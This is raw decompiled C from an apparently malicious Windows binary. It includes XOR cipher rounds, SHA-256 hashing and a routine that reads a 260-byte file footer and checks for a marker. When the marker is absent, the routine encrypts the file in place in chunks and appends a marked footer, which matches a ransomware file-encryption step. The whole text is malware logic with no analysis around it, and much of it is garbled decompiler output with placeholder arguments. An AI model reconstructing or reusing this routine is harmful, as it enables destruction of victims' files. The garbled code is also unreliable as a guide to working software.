    *v10 = *v9;
    *v9 = *v11;
    *v11 = *v12;
    *v12 = *v10;
    *v15 = *v13;
    *v13 = *v15;
    *v17 = *v16;
    *v16 = *v17;
    *v19 = *v18;
    *v18 = *v20;
    *v21 = *v19;
    *v20 = *v21;
    int32_t v54 = v5 + 224; // 0x4013eb
    int32_t v55 = 4; // 0x4013eb
    unsigned char v56 = *(char *)v54; // 0x4013f0
    int32_t result = v56; // 0x4013f0
    int32_t v57 = v54 + 1; // 0x4013f2
    int32_t v58; // 0x4011c0
    char * v59 = (char *)v58; // 0x4013f3
    *v59 = *v59 ^ v56;
    int32_t v60 = v58 + 1; // 0x4013f5
    v55--;
    int32_t v61 = result; // 0x4013f9
    v54 = v57;
    int32_t v62 = v60; // 0x4013f9
    while (v55 != 0) {
        // 0x4013f0
        v56 = *(char *)v54;
        result = v61 & -256 | (int32_t)v56;
        v57 = v54 + 1;
        v59 = (char *)v62;
        *v59 = *v59 ^ v56;
        v60 = v62 + 1;
        v55--;
        v61 = result;
        v54 = v57;
        v62 = v60;
    }
    int32_t v63 = 3; // 0x4013fb
    int32_t v64 = v63; // 0x4013fe
    while (v63 != 0) {
        // 0x4013e6
        v55 = 4;
        v56 = *(char *)v57;
        result = result & -256 | (int32_t)v56;
        v57++;
        v59 = (char *)v60;
        *v59 = *v59 ^ v56;
        v60++;
        v55--;
        v61 = result;
        v54 = v57;
        v62 = v60;
        while (v55 != 0) {
            // 0x4013f0
            v56 = *(char *)v54;
            result = v61 & -256 | (int32_t)v56;
            v57 = v54 + 1;
            v59 = (char *)v62;
            *v59 = *v59 ^ v56;
            v60 = v62 + 1;
            v55--;
            v61 = result;
            v54 = v57;
            v62 = v60;
        }
        // 0x4013fb
        v63 = v64 - 1;
        v64 = v63;
    }
    // 0x401400
    return result;
  lab_0x401330:
    // 0x401330
    goto lab_0x401335;
  lab_0x401348:
    // 0x401348
    v22--;
    v46 = 4;
    if (v22 == 0) {
        // break -> 0x401360
        goto lab_0x401360;
    }
    goto lab_0x401205;
  lab_0x401335:;
    // 0x401335
    int32_t v65; // 0x4011c0
    int32_t v66 = v65;
    int32_t v67; // 0x4011c0
    int32_t v68 = v67;
    int32_t v69; // 0x4011c0
    int32_t v70 = v69;
    char v71 = *(char *)v66; // 0x401335
    int32_t v72 = v66 + 1; // 0x401337
    char * v73 = (char *)v70; // 0x401338
    char v74 = *v73; // 0x401338
    *v73 = v74 ^ v71;
    int32_t v75 = v70 + 1; // 0x40133a
    int32_t v76 = v68 - 1; // 0x40133b
    v69 = v75;
    v67 = v76;
    v65 = v72;
    if (v76 != 0) {
        goto lab_0x401335;
    } else {
        // 0x401340
        int32_t v77; // 0x4011c0
        int32_t v78 = v77 - 1; // 0x401343
        if (v78 != 0) {
            goto lab_0x401330;
        } else {
            goto lab_0x401348;
        }
    }
}

// Address range: 0x401410 - 0x4015bf
// Used cryptographic patterns:
//  - SHA256_Hash_constant_words_K__0x428a2f98_ (32-bit, little endian)
int32_t function_401410(void) {
    // 0x401410
    int32_t v1; // bp-4, 0x401410
    int32_t v2 = &v1; // 0x401411
    int32_t v3 = v2 - 296; // 0x401452
    int32_t v4; // 0x401410
    int32_t v5 = v4 + 1; // 0x401426
    int32_t v6 = 0; // 0x401426
    unsigned char v7 = *(char *)(v5 - 1); // 0x401430
    unsigned char v8 = *(char *)v5; // 0x401437
    unsigned char v9 = *(char *)(v5 + 1); // 0x401440
    unsigned char v10 = *(char *)(v5 + 2); // 0x401449
    *(int32_t *)(4 * v6 + v3) = 256 * (256 * (256 * (int32_t)v7 | (int32_t)v8) | (int32_t)v9) | (int32_t)v10;
    v6++;
    v5 += 4;
    while (v6 != 16) {
        // 0x401430
        v7 = *(char *)(v5 - 1);
        v8 = *(char *)v5;
        v9 = *(char *)(v5 + 1);
        v10 = *(char *)(v5 + 2);
        *(int32_t *)(4 * v6 + v3) = 256 * (256 * (256 * (int32_t)v7 | (int32_t)v8) | (int32_t)v9) | (int32_t)v10;
        v6++;
        v5 += 4;
    }
    int32_t v11 = v2 - 240; // 0x401470
    int32_t v12 = 48; // 0x401470
    uint32_t v13 = *(int32_t *)(v11 - 52); // 0x401472
    uint32_t v14 = *(int32_t *)v11; // 0x401478
    int32_t v15 = *(int32_t *)(v11 - 56); // 0x40149f
    int32_t v16 = *(int32_t *)(v11 - 20); // 0x4014a2
    *(int32_t *)(v11 + 8) = v16 + v15 + ((v13 / 128 | 0x2000000 * v13) ^ v13 / 8 ^ (v13 / 0x40000 | 0x4000 * v13)) + ((v14 / 0x80000 | 0x2000 * v14) ^ v14 / 1024 ^ (v14 / 0x20000 | 0x8000 * v14));
    v12--;
    v11 += 4;
    while (v12 != 0) {
        // 0x401472
        v13 = *(int32_t *)(v11 - 52);
        v14 = *(int32_t *)v11;
        v15 = *(int32_t *)(v11 - 56);
        v16 = *(int32_t *)(v11 - 20);
        *(int32_t *)(v11 + 8) = v16 + v15 + ((v13 / 128 | 0x2000000 * v13) ^ v13 / 8 ^ (v13 / 0x40000 | 0x4000 * v13)) + ((v14 / 0x80000 | 0x2000 * v14) ^ v14 / 1024 ^ (v14 / 0x20000 | 0x8000 * v14));
        v12--;
        v11 += 4;
    }
    // 0x4014b0
    int32_t v17; // 0x401410
    int32_t * v18 = (int32_t *)(v17 + 80); // 0x4014b0
    int32_t v19 = *v18; // 0x4014b0
    int32_t * v20 = (int32_t *)(v17 + 84); // 0x4014ba
    int32_t v21 = *v20; // 0x4014ba
    int32_t * v22 = (int32_t *)(v17 + 88); // 0x4014c0
    int32_t * v23 = (int32_t *)(v17 + 92); // 0x4014c6
    int32_t * v24 = (int32_t *)(v17 + 96); // 0x4014cc
    int32_t * v25 = (int32_t *)(v17 + 100); // 0x4014d2
    int32_t * v26 = (int32_t *)(v17 + 104); // 0x4014d8
    int32_t * v27 = (int32_t *)(v17 + 108); // 0x4014de
    int32_t v28 = 0; // 0x4014ea
    uint32_t v29 = v19;
    uint32_t v30 = *v24;
    int32_t v31 = *v27;
    int32_t result = *v26;
    int32_t v32 = *v25;
    int32_t v33 = *v22;
    int32_t v34 = v21;
    int32_t v35 = *(int32_t *)(v28 + (int32_t)&SHA256_Hash_constant_words_K__0x428a2f98__at_417428); // 0x401518
    int32_t v36 = *(int32_t *)(v28 + v3); // 0x40151e
    int32_t v37 = (result & (v30 ^ -1) | v30 & v32) + v31 + v35 + v36 + ((v30 / 2048 | 0x200000 * v30) ^ (v30 / 0x2000000 | 128 * v30) ^ (v30 / 64 | 0x4000000 * v30)); // 0x401527
    int32_t v38 = ((v29 / 0x2000 | 0x80000 * v29) ^ (v29 / 0x400000 | 1024 * v29) ^ (v29 / 4 | 0x40000000 * v29)) + ((v29 ^ v34) & v33 ^ v29 & v34) + v37; // 0x401557
    int32_t v39 = v37 + *v23; // 0x401560
    v28 += 4;
    int32_t v40 = v29; // 0x40157d
    int32_t v41 = v30; // 0x40157d
    while (v28 < 256) {
        // 0x4014f0
        v29 = v38;
        v30 = v39;
        v31 = result;
        result = v32;
        v32 = v41;
        int32_t v42 = v33;
        v33 = v34;
        v34 = v40;
        v35 = *(int32_t *)(v28 + (int32_t)&SHA256_Hash_constant_words_K__0x428a2f98__at_417428);
        v36 = *(int32_t *)(v28 + v3);
        v37 = (result & (v30 ^ -1) | v30 & v32) + v31 + v35 + v36 + ((v30 / 2048 | 0x200000 * v30) ^ (v30 / 0x2000000 | 128 * v30) ^ (v30 / 64 | 0x4000000 * v30));
        v38 = ((v29 / 0x2000 | 0x80000 * v29) ^ (v29 / 0x400000 | 1024 * v29) ^ (v29 / 4 | 0x40000000 * v29)) + ((v29 ^ v34) & v33 ^ v29 & v34) + v37;
        v39 = v37 + v42;
        v28 += 4;
        v40 = v29;
        v41 = v30;
    }
    // 0x401583
    *v20 = v29 + v21;
    *v18 = v38 + v19;
    *v22 = *v22 + v34;
    *v23 = *v23 + v33;
    *v24 = *v24 + v39;
    *v25 = *v25 + v30;
    *v26 = *v26 + v32;
    *v27 = *v27 + result;
    return result;
}

// Address range: 0x4015c0 - 0x4017af
int32_t function_4015c0(void) {
    // 0x4015c0
    int32_t v1; // 0x4015c0
    int32_t * v2 = (int32_t *)(v1 + 64); // 0x4015d1
    uint32_t v3 = *v2; // 0x4015d1
    *(char *)(v3 + v1) = -128;
    uint32_t v4 = v3 + 1; // 0x4015d8
    bool v5; // 0x4015c0
    if (v3 >= 56) {
        if (v4 < 64) {
            uint32_t v6 = 63 - v3; // 0x40160c
            int32_t v7 = v4 + v1; // 0x40160e
            uint32_t v8 = v6 / 4; // 0x401612
            __asm_rep_stosd_memset((char *)v7, 0, v8);
            __asm_rep_stosb_memset((char *)(v8 * (v5 ? -4 : 4) + v7), 0, v6 & 3);
        }
        // 0x40161e
        function_401410();
        function_407730(v1, 0, 56);
    } else {
        if (v4 < 56) {
            uint32_t v9 = 55 - v3; // 0x4015ec
            int32_t v10 = v4 + v1; // 0x4015ee
            uint32_t v11 = v9 / 4; // 0x4015f2
            __asm_rep_stosd_memset((char *)v10, 0, v11);
            __asm_rep_stosb_memset((char *)(v11 * (v5 ? -4 : 4) + v10), 0, v9 & 3);
        }
    }
    int32_t * v12 = (int32_t *)(v1 + 72); // 0x40163c
    uint32_t v13 = *v12; // 0x40163c
    uint32_t v14 = v13 + 8 * *v2; // 0x40163c
    *v12 = v14;
    int32_t v15 = v1 + 76; // 0x401642
    int32_t * v16 = (int32_t *)v15; // 0x401642
    *v16 = *v16 + (int32_t)(v14 < v13);
    *(char *)(v1 + 63) = (char)v14;
    *(char *)(v1 + 62) = *(char *)(v1 + 73);
    *(char *)(v1 + 61) = *(char *)(v1 + 74);
    *(char *)(v1 + 60) = *(char *)(v1 + 75);
    *(char *)(v1 + 59) = *(char *)v15;
    *(char *)(v1 + 58) = *(char *)(v1 + 77);
    *(char *)(v1 + 57) = *(char *)(v1 + 78);
    *(char *)(v1 + 56) = *(char *)(v1 + 79);
    function_401410();
    int32_t * v17 = (int32_t *)(v1 + 92); // 0x40168a
    uint32_t v18 = *v17; // 0x40168a
    int32_t * v19 = (int32_t *)(v1 + 80); // 0x401690
    int32_t v20; // 0x4015c0
    *(char *)v20 = (char)(*v19 / 0x1000000);
    int32_t * v21 = (int32_t *)(v1 + 84); // 0x401698
    uint32_t v22 = *(int32_t *)(v1 + 100); // 0x40169e
    uint32_t v23 = *(int32_t *)(v1 + 104); // 0x4016a1
    *(char *)(v20 + 4) = (char)(*v21 / 0x1000000);
    int32_t * v24 = (int32_t *)(v1 + 88); // 0x4016a7
    uint32_t v25 = *(int32_t *)(v1 + 108); // 0x4016aa
    *(char *)(v20 + 8) = (char)(*v24 / 0x1000000);
    *(char *)(v20 + 12) = (char)(*v17 / 0x1000000);
    int32_t * v26 = (int32_t *)(v1 + 96); // 0x4016c1
    uint32_t v27 = *v26; // 0x4016c1
    *(char *)(v20 + 16) = (char)(v27 / 0x1000000);
    *(char *)(v20 + 20) = (char)(v22 / 0x1000000);
    *(char *)(v20 + 24) = (char)(v23 / 0x1000000);
    *(char *)(v20 + 28) = (char)(v25 / 0x1000000);
    *(char *)(v20 + 1) = (char)(*v19 / 0x10000);
    *(char *)(v20 + 5) = (char)(*v21 / 0x10000);
    *(char *)(v20 + 9) = (char)(*v24 / 0x10000);
    *(char *)(v20 + 13) = (char)(v18 / 0x10000);
    *(char *)(v20 + 17) = (char)(v27 / 0x10000);
    *(char *)(v20 + 21) = (char)(v22 / 0x10000);
    *(char *)(v20 + 25) = (char)(v23 / 0x10000);
    *(char *)(v20 + 29) = (char)(v25 / 0x10000);
    *(char *)(v20 + 23) = (char)v22;
    *(char *)(v20 + 27) = (char)v23;
    *(char *)(v20 + 31) = (char)v25;
    *(char *)(v20 + 2) = (char)(*v19 / 256);
    *(char *)(v20 + 6) = (char)(*v21 / 256);
    *(char *)(v20 + 10) = (char)(*v24 / 256);
    *(char *)(v20 + 14) = (char)(v18 / 256);
    *(char *)(v20 + 18) = (char)(v27 / 256);
    *(char *)(v20 + 22) = (char)(v22 / 256);
    *(char *)(v20 + 26) = (char)(v23 / 256);
    *(char *)(v20 + 30) = (char)(v25 / 256);
    *(char *)(v20 + 3) = (char)*v19;
    *(char *)(v20 + 7) = (char)*v21;
    *(char *)(v20 + 11) = (char)*v24;
    *(char *)(v20 + 15) = (char)*v17;
    int32_t result = *v26; // 0x4017a2
    *(char *)(v20 + 19) = (char)result;
    return result;
}

// Address range: 0x4017b0 - 0x401cf5
// Used cryptographic patterns:
//  - CRC_32_IEEE_802_3_poly_0x04C11DB7 (32-bit, little endian)
int32_t function_4017b0(int32_t a1, int32_t a2) {
    struct _LARGE_INTEGER liDistanceToMove; // 0x40181e
    // 0x4017b0
    int32_t v1; // 0x4017b0
    function_4119e0(v1);
    int32_t * hFile = (int32_t *)a1; // 0x4017cf
    int32_t lpFileSize; // bp+40, 0x4017b0
    GetFileSizeEx((int32_t *)*hFile, (struct _LARGE_INTEGER *)&lpFileSize);
    int32_t v2; // bp+88, 0x4017b0
    function_407730((int32_t)&v2, 0, 92);
    int32_t v3; // bp+184, 0x4017b0
    function_407730((int32_t)&v3, 0, 260);
    int32_t hFile2 = *hFile; // 0x40181c
    liDistanceToMove = (struct {int64_t e0;}){
        .e0 = 0
    };
    uint32_t v4; // 0x4017b0
    liDistanceToMove.e0 = v4 - 260;
    int32_t v5; // 0x4017b0
    SetFilePointerEx((int32_t *)hFile2, liDistanceToMove, (struct _LARGE_INTEGER *)(v5 - (int32_t)(v4 < 260)), 0);
    int32_t hFile3 = *hFile; // 0x401834
    int32_t v6 = hFile3; // bp-72, 0x401834
    int32_t lpBuffer; // bp+164, 0x4017b0
    int32_t lpNumberOfBytesRead; // bp-24, 0x4017b0
    ReadFile((int32_t *)hFile3, &lpBuffer, 260, &lpNumberOfBytesRead, NULL);
    int32_t v7 = &v6; // 0x401847
    int32_t v8; // 0x4017b0
    if (v8 != -0x54332326) {
        // 0x40184d
        GetTickCount();
        int32_t v9; // bp+76, 0x4017b0
        function_4053d0(&v9, -1);
        int32_t v10; // bp+100, 0x4017b0
        function_4053d0(&v10, -1);
        function_401010();
        int128_t v11; // 0x4017b0
        int128_t v12 = __asm_movups(v11); // 0x4018d7
        int128_t v13; // 0x4017b0
        __asm_movups_1(v13, v12);
        int128_t v14 = __asm_xorps(v12, v12); // 0x4018eb
        __asm_movlpd(0, v14);
        int32_t hFile4 = *hFile; // 0x401902
        SetFilePointerEx((int32_t *)hFile4, (struct {int64_t e0;}){.e0 = 0}, (struct _LARGE_INTEGER *)hFile2, (int32_t)&g266);
        __asm_movlpd(-1, __asm_xorps(v14, v14));
        int32_t hFile5 = *hFile; // 0x401927
        int32_t v15 = hFile5; // bp-128, 0x401927
        int32_t v16 = &v15; // 0x401927
        int32_t lpBuffer2; // bp+628, 0x4017b0
        ReadFile((int32_t *)hFile5, &lpBuffer2, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266);
        int32_t v17 = v16; // 0x401939
        if (hFile2 != 0) {
            // 0x40193f
            v6 = 0;
            int32_t v18 = v16;
            int32_t v19 = hFile2; // 0x40195b
            if (hFile2 < 0x1000) {
                // 0x40195d
                v19 = hFile2 + 31 & -32;
                *(int32_t *)(v18 + 24) = v19;
                *(int32_t *)(v18 + 28) = v19;
            }
            int32_t * v20 = (int32_t *)(v18 + 48); // 0x40196d
            *v20 = a2;
            int32_t v21 = v18 + 736; // 0x401971
            int32_t v22 = v19; // 0x40197a
            int32_t v23 = v21; // 0x40197a
            int32_t v24; // 0x4017b0
            int32_t v25; // 0x4017b0
            int32_t v26; // 0x4017b0
            int32_t v27; // 0x4017b0
            int32_t v28; // 0x4017b0
            int32_t v29; // 0x4017b0
            int32_t * v30; // 0x4017b0
            int32_t v31; // 0x40199f
            int32_t v32; // 0x4019b9
            int32_t v33; // 0x4019c8
            char * v34; // 0x4019e6
            int32_t v35; // 0x4019e9
            int32_t v36; // 0x4019fe
            int32_t v37; // 0x401a04
            int32_t v38; // 0x401a0b
            int32_t v39; // 0x4019b9
            unsigned char v40; // 0x401980
            int32_t v41; // 0x401993
            int32_t v42; // 0x401993
            int32_t v43; // 0x40199a
            if (v19 == 0) {
                // 0x4019a7
                *(int32_t *)(v18 + 136) = a2;
                *(int32_t *)(v18 + 24) = v21;
                v39 = v18 + 720;
                v24 = v39;
                v29 = v39;
                v27 = a2;
            } else {
                v40 = *(char *)v23;
                v41 = *(int32_t *)(4 * (a2 / 0x1000000 ^ (int32_t)v40) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_417028);
                v42 = v41 ^ 256 * a2;
                v43 = v22 - 1;
                v22 = v43;
                v23++;
                v26 = v42;
                while (v43 != 0) {
                    // 0x401980
                    v40 = *(char *)v23;
                    v41 = *(int32_t *)(4 * (v26 / 0x1000000 ^ (int32_t)v40) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_417028);
                    v42 = v41 ^ 256 * v26;
                    v43 = v22 - 1;
                    v22 = v43;
                    v23++;
                    v26 = v42;
                }
                // 0x4019a7
                v30 = (int32_t *)(v18 + 24);
                v31 = *v30;
                *v20 = v42;
                *(int32_t *)(v18 + 136) = v42;
                *v30 = v21;
                v32 = v18 + 720;
                v24 = v32;
                v29 = v32;
                v27 = v42;
                if (v31 != 0) {
                    // 0x4019c4
                    v33 = (v31 - 1) / 16 + 1;
                    *(int32_t *)(v18 + 32) = v33;
                    v37 = v21;
                    v28 = v32;
                    v38 = v33;
                    v25 = v37;
                    v35 = 16;
                    v34 = (char *)v25;
                    *v34 = *v34 ^ *(char *)(v28 - v37 + v25);
                    v35--;
                    v25++;
                    while (v35 != 0) {
                        // 0x4019e0
                        v34 = (char *)v25;
                        *v34 = *v34 ^ *(char *)(v28 - v37 + v25);
                        v35--;
                        v25++;
                    }
                    // 0x4019ee
                    function_4011c0();
                    v36 = *v30;
                    v37 = v36 + 16;
                    *v30 = v37;
                    v38--;
                    v28 = v36;
                    while (v38 != 0) {
                        // 0x4019d0
                        v25 = v37;
                        v35 = 16;
                        v34 = (char *)v25;
                        *v34 = *v34 ^ *(char *)(v28 - v37 + v25);
                        v35--;
                        v25++;
                        while (v35 != 0) {
                            // 0x4019e0
                            v34 = (char *)v25;
                            *v34 = *v34 ^ *(char *)(v28 - v37 + v25);
                            v35--;
                            v25++;
                        }
                        // 0x4019ee
                        function_4011c0();
                        v36 = *v30;
                        v37 = v36 + 16;
                        *v30 = v37;
                        v38--;
                        v28 = v36;
                    }
                    // 0x401a10
                    v24 = v32;
                    v29 = v36;
                    v27 = *v20;
                }
            }
            int32_t v44 = v27;
            int128_t v45 = __asm_movups(*(int128_t *)v29); // 0x401a14
            *(int32_t *)(v18 - 4) = 0;
            *(int32_t *)(v18 - 8) = 0;
            *(int32_t *)(v18 - 12) = *(int32_t *)(v18 + 60);
            __asm_movups_1(*(int128_t *)v24, v45);
            *(int32_t *)(v18 - 16) = *(int32_t *)(v18 + 40);
            *(int32_t *)(v18 - 20) = *hFile;
            SetFilePointerEx(&g266, (struct {int64_t e0;}){.e0 = (int64_t)&g266}, (struct _LARGE_INTEGER *)&g266, (int32_t)&g266);
            *(int32_t *)(v18 - 24) = 0;
            *(int32_t *)(v18 - 28) = v18 + 56;
            int32_t v46 = v18 - 32; // 0x401a3d
            *(int32_t *)v46 = *(int32_t *)(v18 + 8);
            *(int32_t *)(v18 - 36) = v18 + 716;
            *(int32_t *)(v18 - 40) = *hFile;
            WriteFile(&g266, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266);
            int32_t v47 = *(int32_t *)(v18 + 104); // 0x401a51
            *(int32_t *)(v18 - 44) = 0;
            int32_t * v48 = (int32_t *)(v18 + 12); // 0x401a66
            *(int32_t *)(v18 - 48) = 0;
            uint32_t v49 = 0x8088405 * *v48 + 1; // 0x401a72
            *v48 = v49;
            uint32_t v50 = v49 % (v47 == 0 ? 1 : v47);
            int32_t * v51 = (int32_t *)(v18 + 16); // 0x401a79
            int32_t * v52 = (int32_t *)(v18 + 4); // 0x401a84
            uint32_t v53 = *v52; // 0x401a84
            uint32_t v54 = v50 + 1 + v53; // 0x401a84
            *v52 = v54;
            int32_t v55 = *v51 + (int32_t)(v50 == -1) + (int32_t)(v54 < v53); // 0x401a88
            *v51 = v55;
            int32_t v56 = 0x1000 * v55 | v54 / 0x100000; // 0x401a92
            int32_t v57 = 0x1000 * v54; // 0x401a96
            int32_t * v58 = (int32_t *)(v18 - 52); // 0x401a99
            *v58 = v56;
            int32_t * v59 = (int32_t *)(v18 - 56); // 0x401a9a
            *v59 = v57;
            *(int32_t *)(v18 - 60) = *hFile;
            *(int32_t *)(v18 + 20) = v56;
            *(int32_t *)v18 = v57;
            SetFilePointerEx(&g266, (struct {int64_t e0;}){.e0 = (int64_t)&g266}, (struct _LARGE_INTEGER *)&g266, (int32_t)&g266);
            *(int32_t *)(v18 - 64) = 0;
            *(int32_t *)(v18 - 68) = v46;
            *(int32_t *)(v18 - 72) = 0x1000;
            *(int32_t *)(v18 - 76) = v18 + 676;
            int32_t v60 = v18 - 80; // 0x401abf
            *(int32_t *)v60 = *hFile;
            ReadFile(&g266, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266);
            int32_t v61 = *v58; // 0x401ac7
            *v59 = v61;
            v17 = v60;
            while (v61 != 0) {
                int32_t v62 = v44;
                v18 = v60;
                int32_t v63 = v61;
                v19 = v63;
                if (v63 < 0x1000) {
                    // 0x40195d
                    v19 = v63 + 31 & -32;
                    *(int32_t *)(v18 + 24) = v19;
                    *(int32_t *)(v18 + 28) = v19;
                }
                // 0x40196b
                v20 = (int32_t *)(v18 + 48);
                *v20 = v62;
                v21 = v18 + 736;
                v22 = v19;
                v23 = v21;
                v26 = v62;
                if (v19 == 0) {
                    // 0x4019a7
                    *(int32_t *)(v18 + 136) = v62;
                    *(int32_t *)(v18 + 24) = v21;
                    v39 = v18 + 720;
                    v24 = v39;
                    v29 = v39;
                    v27 = v62;
                } else {
                    v40 = *(char *)v23;
                    v41 = *(int32_t *)(4 * (v26 / 0x1000000 ^ (int32_t)v40) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_417028);
                    v42 = v41 ^ 256 * v26;
                    v43 = v22 - 1;
                    v22 = v43;
                    v23++;
                    v26 = v42;
                    while (v43 != 0) {
                        // 0x401980
                        v40 = *(char *)v23;
                        v41 = *(int32_t *)(4 * (v26 / 0x1000000 ^ (int32_t)v40) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_417028);
                        v42 = v41 ^ 256 * v26;
                        v43 = v22 - 1;
                        v22 = v43;
                        v23++;
                        v26 = v42;
                    }
                    // 0x4019a7
                    v30 = (int32_t *)(v18 + 24);
                    v31 = *v30;
                    *v20 = v42;
                    *(int32_t *)(v18 + 136) = v42;
                    *v30 = v21;
                    v32 = v18 + 720;
                    v24 = v32;
                    v29 = v32;
                    v27 = v42;
                    if (v31 != 0) {
                        // 0x4019c4
                        v33 = (v31 - 1) / 16 + 1;
                        *(int32_t *)(v18 + 32) = v33;
                        v37 = v21;
                        v28 = v32;
                        v38 = v33;
                        v25 = v37;
                        v35 = 16;
                        v34 = (char *)v25;
                        *v34 = *v34 ^ *(char *)(v28 - v37 + v25);
                        v35--;
                        v25++;
                        while (v35 != 0) {
                            // 0x4019e0
                            v34 = (char *)v25;
                            *v34 = *v34 ^ *(char *)(v28 - v37 + v25);
                            v35--;
                            v25++;
                        }
                        // 0x4019ee
                        function_4011c0();
                        v36 = *v30;
                        v37 = v36 + 16;
                        *v30 = v37;
                        v38--;
                        v28 = v36;
                        while (v38 != 0) {
                            // 0x4019d0
                            v25 = v37;
                            v35 = 16;
                            v34 = (char *)v25;
                            *v34 = *v34 ^ *(char *)(v28 - v37 + v25);
                            v35--;
                            v25++;
                            while (v35 != 0) {
                                // 0x4019e0
                                v34 = (char *)v25;
                                *v34 = *v34 ^ *(char *)(v28 - v37 + v25);
                                v35--;
                                v25++;
                            }
                            // 0x4019ee
                            function_4011c0();
                            v36 = *v30;
                            v37 = v36 + 16;
                            *v30 = v37;
                            v38--;
                            v28 = v36;
                        }
                        // 0x401a10
                        v24 = v32;
                        v29 = v36;
                        v27 = *v20;
                    }
                }
                // 0x401a14
                v44 = v27;
                v45 = __asm_movups(*(int128_t *)v29);
                *(int32_t *)(v18 - 4) = 0;
                *(int32_t *)(v18 - 8) = 0;
                *(int32_t *)(v18 - 12) = *(int32_t *)(v18 + 60);
                __asm_movups_1(*(int128_t *)v24, v45);
                *(int32_t *)(v18 - 16) = *(int32_t *)(v18 + 40);
                *(int32_t *)(v18 - 20) = *hFile;
                SetFilePointerEx(&g266, (struct {int64_t e0;}){.e0 = (int64_t)&g266}, (struct _LARGE_INTEGER *)&g266, (int32_t)&g266);
                *(int32_t *)(v18 - 24) = 0;
                *(int32_t *)(v18 - 28) = v18 + 56;
                v46 = v18 - 32;
                *(int32_t *)v46 = *(int32_t *)(v18 + 8);
                *(int32_t *)(v18 - 36) = v18 + 716;
                *(int32_t *)(v18 - 40) = *hFile;
                WriteFile(&g266, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266);
                v47 = *(int32_t *)(v18 + 104);
                *(int32_t *)(v18 - 44) = 0;
                v48 = (int32_t *)(v18 + 12);
                *(int32_t *)(v18 - 48) = 0;
                v49 = 0x8088405 * *v48 + 1;
                *v48 = v49;
                v50 = v49 % (v47 == 0 ? 1 : v47);
                v51 = (int32_t *)(v18 + 16);
                v52 = (int32_t *)(v18 + 4);
                v53 = *v52;
                v54 = v50 + 1 + v53;
                *v52 = v54;
                v55 = *v51 + (int32_t)(v50 == -1) + (int32_t)(v54 < v53);
                *v51 = v55;
                v56 = 0x1000 * v55 | v54 / 0x100000;
                v57 = 0x1000 * v54;
                v58 = (int32_t *)(v18 - 52);
                *v58 = v56;
                v59 = (int32_t *)(v18 - 56);
                *v59 = v57;
                *(int32_t *)(v18 - 60) = *hFile;
                *(int32_t *)(v18 + 20) = v56;
                *(int32_t *)v18 = v57;
                SetFilePointerEx(&g266, (struct {int64_t e0;}){.e0 = (int64_t)&g266}, (struct _LARGE_INTEGER *)&g266, (int32_t)&g266);
                *(int32_t *)(v18 - 64) = 0;
                *(int32_t *)(v18 - 68) = v46;
                *(int32_t *)(v18 - 72) = 0x1000;
                *(int32_t *)(v18 - 76) = v18 + 676;
                v60 = v18 - 80;
                *(int32_t *)v60 = *hFile;
                ReadFile(&g266, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266);
                v61 = *v58;
                *v59 = v61;
                v17 = v60;
            }
        }
        int32_t v64 = v17;
        int32_t v65 = v64 - 4; // 0x401ad7
        int32_t * v66 = (int32_t *)v65; // 0x401ad7
        *v66 = 260;
        int32_t * v67 = (int32_t *)(v64 - 8); // 0x401ae3
        *v67 = 0;
        int32_t * v68 = (int32_t *)(v64 - 12); // 0x401ae5
        *v68 = v64 + 216;
        function_407730((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        *(int32_t *)(v64 + 472) = -0x54332326;
        *v66 = 4;
        *v67 = 8;
        *v68 = (int32_t)GetProcessHeap();
        int32_t * v69 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266); // 0x401b0c
        *(int32_t *)(v64 - 16) = 4;
        *(int32_t *)(v64 - 20) = 8;
        *(int32_t *)(v64 + 28) = (int32_t)v69;
        *(int32_t *)(v64 - 24) = (int32_t)GetProcessHeap();
        int32_t * v70 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266); // 0x401b19
        *(int32_t *)(v64 - 28) = 4;
        *(int32_t *)(v64 - 32) = 8;
        *(int32_t *)(v64 + 8) = (int32_t)v70;
        int32_t * v71 = (int32_t *)(v64 + 56); // 0x401b23
        *v71 = 1;
        int32_t * v72 = (int32_t *)(v64 + 60); // 0x401b2b
        *v72 = 0;
        *(int32_t *)(v64 - 36) = (int32_t)GetProcessHeap();
        int32_t * v73 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266); // 0x401b36
        *(int32_t *)(v64 - 40) = 4;
        *(int32_t *)(v64 - 44) = 8;
        int32_t * v74 = (int32_t *)(v64 + 52); // 0x401b3c
        *v74 = (int32_t)v73;
        *v71 = 1;
        *v72 = 0;
        *(int32_t *)(v64 - 48) = (int32_t)GetProcessHeap();
        int32_t * v75 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266); // 0x401b53
        *(int32_t *)(v64 - 52) = (int32_t)&g144;
        *v74 = (int32_t)v75;
        int32_t v76 = v64 + 32; // 0x401b61
        function_404550((int32_t)&g266);
        int128_t v77 = __asm_movaps(*(int128_t *)v76); // 0x401b6a
        int32_t v78 = *v74; // 0x401b6f
        int32_t v79 = v64 - 72; // 0x401b73
        *(int32_t *)v79 = v76;
        int32_t v80 = v64 + 48; // 0x401b76
        *(int32_t *)v80 = 1;
        int32_t v81 = v64 - 76; // 0x401b7e
        int32_t * v82 = (int32_t *)v81; // 0x401b7e
        *v82 = v76;
        *(int32_t *)v78 = 0x10001;
        __asm_movups_1(*(int128_t *)v79, v77);
        __asm_movq_2(*(int64_t *)(v64 - 56), __asm_movq(*(int64_t *)v80));
        int32_t * v83 = (int32_t *)(v64 - 80); // 0x401b9a
        *v83 = v64 + 72;
        *(int32_t *)(v64 - 84) = v64 + 168;
        function_4055e0((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        int128_t v84 = __asm_psrldq(__asm_movaps(*(int128_t *)v65), 8); // 0x401bad
        *(int32_t *)(v64 - 88) = __asm_movd_7(v84);
        *(int32_t *)(v64 - 92) = 0;
        int32_t * v85 = GetProcessHeap(); // 0x401bb9
